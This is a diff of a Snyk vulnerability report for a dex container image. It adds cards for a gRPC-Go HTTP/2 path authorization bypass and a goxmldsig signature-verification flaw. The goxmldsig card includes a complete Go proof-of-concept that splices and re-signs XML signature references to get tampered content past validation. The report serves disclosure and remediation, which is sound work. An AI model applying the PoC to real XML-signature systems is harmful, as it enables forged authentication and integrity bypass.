@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title>Snyk test report</title>
-  <meta name="description" content="46 known vulnerabilities found in 141 vulnerable dependency paths.">
+  <meta name="description" content="48 known vulnerabilities found in 144 vulnerable dependency paths.">
   <base target="_blank">
   <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.png"
     sizes="194x194">
@@ -492,7 +492,7 @@
               <div class="header-wrap">
                   <h1 class="project__header__title">Snyk test report</h1>
     
-                <p class="timestamp">March 8th 2026, 12:33:53 am (UTC+00:00)</p>
+                <p class="timestamp">March 22nd 2026, 12:38:26 am (UTC+00:00)</p>
               </div>
               <div class="source-panel">
                 <span>Scanned the following paths:</span>
@@ -505,8 +505,8 @@
               </div>
     
               <div class="meta-counts">
-                <div class="meta-count"><span>46</span> <span>known vulnerabilities</span></div>
-                <div class="meta-count"><span>141 vulnerable dependency paths</span></div>
+                <div class="meta-count"><span>48</span> <span>known vulnerabilities</span></div>
+                <div class="meta-count"><span>144 vulnerable dependency paths</span></div>
                 <div class="meta-count"><span>1131</span> <span>dependencies</span></div>
               </div><!-- .meta-counts -->
             </div><!-- .layout-container--short -->
@@ -515,6 +515,89 @@
 
     <div class="layout-container" style="padding-top: 35px;">
       <div class="cards--vuln filter--patch filter--ignore">
+        <div class="card card--vuln  disclosure--not-new severity--critical" data-snyk-test="critical">
+            <h2 class="card__title">Incorrect Authorization</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--critical">
+                        <span class="label__text">critical severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: ghcr.io/dexidp/dex:v2.43.0/hairyhenderson/gomplate/v4 <span class="list-paths__item__arrow">›</span> /usr/local/bin/gomplate
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            google.golang.org/grpc
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                github.com/hairyhenderson/gomplate/v4@* and google.golang.org/grpc@v1.68.1
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/hairyhenderson/gomplate/v4@*
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        google.golang.org/grpc@v1.68.1
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/dexidp/dex@*
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        google.golang.org/grpc@v1.72.1
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Incorrect Authorization in the processing of HTTP/2 <code>:path</code> pseudo-headers in <code>handleStream()</code>. An attacker can gain unauthorized access to restricted resources by sending requests with malformed <code>:path</code> headers that omit the leading slash. This is only exploitable if the server uses path-based authorization interceptors, has deny rules that use canonical paths with leading slashes, and has a fallback allow rule in its policy.</p>
+        <h2 id="workaround">Workaround</h2>
+        <p>This vulnerability can be mitigated by adding a validating interceptor that rejects requests with malformed paths, configuring infrastructure (such as reverse proxies) to enforce strict HTTP/2 compliance, or switching to a default-deny authorization policy.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>google.golang.org/grpc</code> to version 1.79.3 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/grpc/grpc-go/commit/72186f163e75a065c39e6f7df9b6dea07fbdeff5">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GOOGLEGOLANGORGGRPC-15691172">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
             <h2 class="card__title">CVE-2025-69421</h2>
             <div class="card__section">
@@ -1053,6 +1136,193 @@
         
             <div class="cta card__cta">
                 <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GOOPENTELEMETRYIOOTELSDKRESOURCE-15182758">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Improper Verification of Cryptographic Signature</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--high">
+                        <span class="label__text">high severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: ghcr.io/dexidp/dex:v2.43.0/dexidp/dex <span class="list-paths__item__arrow">›</span> /usr/local/bin/dex
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            github.com/russellhaering/goxmldsig
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                github.com/dexidp/dex@* and github.com/russellhaering/goxmldsig@v1.5.0
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/dexidp/dex@*
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/russellhaering/goxmldsig@v1.5.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/russellhaering/goxmldsig">github.com/russellhaering/goxmldsig</a> is a XML Digital Signatures implemented in pure Go.</p>
+        <p>Affected versions of this package are vulnerable to Improper Verification of Cryptographic Signature through the <code>validateSignature</code> function in the <code>validate.go</code> file. An attacker can bypass integrity checks and alter the contents of signed elements by exploiting pointer aliasing on a loop variable, allowing them to replace one element&#39;s contents with another referenced element&#39;s.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code>package main
+        
+        import (
+            &quot;crypto/rand&quot;
+            &quot;crypto/rsa&quot;
+            &quot;crypto/tls&quot;
+            &quot;crypto/x509&quot;
+            &quot;encoding/base64&quot;
+            &quot;fmt&quot;
+            &quot;math/big&quot;
+            &quot;time&quot;
+        
+            &quot;github.com/beevik/etree&quot;
+            dsig &quot;github.com/russellhaering/goxmldsig&quot;
+        )
+        
+        func main() {
+            key, err := rsa.GenerateKey(rand.Reader, 2048)
+            if err != nil {
+                panic(err)
+            }
+        
+            template := &amp;x509.Certificate{
+                SerialNumber: big.NewInt(1),
+                NotBefore:    time.Now().Add(-1 * time.Hour),
+                NotAfter:     time.Now().Add(1 * time.Hour),
+            }
+        
+            certDER, err := x509.CreateCertificate(rand.Reader, template, template, &amp;key.PublicKey, key)
+            if err != nil {
+                panic(err)
+            }
+        
+            cert, _ := x509.ParseCertificate(certDER)
+        
+            doc := etree.NewDocument()
+            root := doc.CreateElement(&quot;Root&quot;)
+            root.CreateAttr(&quot;ID&quot;, &quot;target&quot;)
+            root.SetText(&quot;Malicious Content&quot;)
+        
+            tlsCert := tls.Certificate{
+                Certificate: [][]byte{cert.Raw},
+                PrivateKey:  key,
+            }
+        
+            ks := dsig.TLSCertKeyStore(tlsCert)
+            signingCtx := dsig.NewDefaultSigningContext(ks)
+        
+            sig, err := signingCtx.ConstructSignature(root, true)
+            if err != nil {
+                panic(err)
+            }
+        
+            signedInfo := sig.FindElement(&quot;./SignedInfo&quot;)
+        
+            existingRef := signedInfo.FindElement(&quot;./Reference&quot;)
+            existingRef.CreateAttr(&quot;URI&quot;, &quot;#dummy&quot;)
+        
+            originalEl := etree.NewElement(&quot;Root&quot;)
+            originalEl.CreateAttr(&quot;ID&quot;, &quot;target&quot;)
+            originalEl.SetText(&quot;Original Content&quot;)
+        
+            sig1, _ := signingCtx.ConstructSignature(originalEl, true)
+            ref1 := sig1.FindElement(&quot;./SignedInfo/Reference&quot;).Copy()
+        
+            signedInfo.InsertChildAt(existingRef.Index(), ref1)
+        
+            c14n := signingCtx.Canonicalizer
+        
+            detachedSI := signedInfo.Copy()
+            if detachedSI.SelectAttr(&quot;xmlns:&quot;+dsig.DefaultPrefix) == nil {
+                detachedSI.CreateAttr(&quot;xmlns:&quot;+dsig.DefaultPrefix, dsig.Namespace)
+            }
+        
+            canonicalBytes, err := c14n.Canonicalize(detachedSI)
+            if err != nil {
+                fmt.Println(&quot;c14n error:&quot;, err)
+                return
+            }
+        
+            hash := signingCtx.Hash.New()
+            hash.Write(canonicalBytes)
+            digest := hash.Sum(nil)
+        
+            rawSig, err := rsa.SignPKCS1v15(rand.Reader, key, signingCtx.Hash, digest)
+            if err != nil {
+                panic(err)
+            }
+        
+            sigVal := sig.FindElement(&quot;./SignatureValue&quot;)
+            sigVal.SetText(base64.StdEncoding.EncodeToString(rawSig))
+        
+            certStore := &amp;dsig.MemoryX509CertificateStore{
+                Roots: []*x509.Certificate{cert},
+            }
+            valCtx := dsig.NewDefaultValidationContext(certStore)
+        
+            root.AddChild(sig)
+        
+            doc.SetRoot(root)
+            str, _ := doc.WriteToString()
+            fmt.Println(&quot;XML:&quot;)
+            fmt.Println(str)
+        
+            validated, err := valCtx.Validate(root)
+            if err != nil {
+                fmt.Println(&quot;validation failed:&quot;, err)
+            } else {
+                fmt.Println(&quot;validation ok&quot;)
+                fmt.Println(&quot;validated text:&quot;, validated.Text())
+            }
+        }
+        </code></pre>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>github.com/russellhaering/goxmldsig</code> to version 1.6.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/russellhaering/goxmldsig/commit/db3d1e31f7535d7f5debb49851b9e9a2ff08b936">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUSSELLHAERINGGOXMLDSIG-15692488">More about this vulnerability</a></p>
             </div>
         
         </div><!-- .card -->
